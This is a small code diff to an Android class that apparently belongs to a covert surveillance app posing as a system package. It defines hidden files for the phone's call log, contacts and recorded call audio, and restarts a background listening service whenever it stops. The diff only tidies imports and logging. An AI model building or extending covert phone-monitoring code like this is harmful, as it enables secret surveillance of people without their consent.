@@ -6,15 +6,9 @@ import java.util.List;
 import android.app.ActivityManager;
 import android.content.Context;
 import android.content.Intent;
-import android.media.AudioManager;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
-import android.net.NetworkInfo.State;
 import android.os.Environment;
-import android.util.Log;
 
 import com.android.system.controled.service.ListenService;
-import com.android.system.controled.util.ContactsUtil;
 import com.android.system.controled.util.DoAboutCodeUtils;
 import com.android.system.controled.util.FileUtil;
 
@@ -69,7 +63,7 @@ public class Globle {
 	public static final String SERVICE_NAME_LISTEN = "com.android.system.controled.service.ListenService";
 
 	public static final String FILE_SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/receiver/";
-	
+
 	public static final File FILE_CALL_LOG = new File(FILE_SDCARD + ".androidcall.txt");
 	public static final File FILE_CONTACTS = new File(FILE_SDCARD + ".contacts.txt");
 	public static final String FILEPATH_AUDIOS_CALL = FILE_SDCARD + ".callaudios/";
@@ -95,9 +89,9 @@ public class Globle {
 			Intent i = new Intent(context, ListenService.class);
 			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 			context.startService(i);
-			Log.v("service", "service is not running, need to start service!");
+			Debug.v("service", "service is not running, need to start service!");
 		} else {
-			Log.v("service", "service is running, no need to start service!");
+			Debug.v("service", "service is running, no need to start service!");
 		}
 
 	}
